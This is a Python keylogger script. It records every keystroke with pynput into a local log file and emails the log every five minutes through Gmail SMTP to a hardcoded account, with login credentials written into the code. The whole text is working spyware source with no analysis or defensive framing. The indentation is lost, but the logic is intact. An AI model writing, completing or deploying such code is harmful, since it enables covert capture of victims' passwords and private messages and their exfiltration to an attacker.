from pynput import keyboard
import logging
import smtplib
import threading

#Config Logging
log_file= "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

#Email cred
EMAIL_ADDRESS = "Billgates676767"
EMAIL_PASSWORD = "Gamer9000"
TO_EMAIL = "Billgates676767"

def send_email():
try:
with open(log_file, "r") as file:
log_content = file.read()

server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
server.sendmail(EMAIL_ADDRESS, TO_EMAIL, f"Subject: Keylog Report\n\n{log_content}")
server.quit()
except Exception as e:
print(f"Email error: {e}")

#Schedule email
threading.Timer(300, send_email).start()

def on_press(key):
try:
logging.info(str(key))
except Exception as e:
print(f"Error: {e}")

#start loop
send_email()

#keyboard events
with keyboard.Listener(on_press=on_press) as listener:
listener.join()

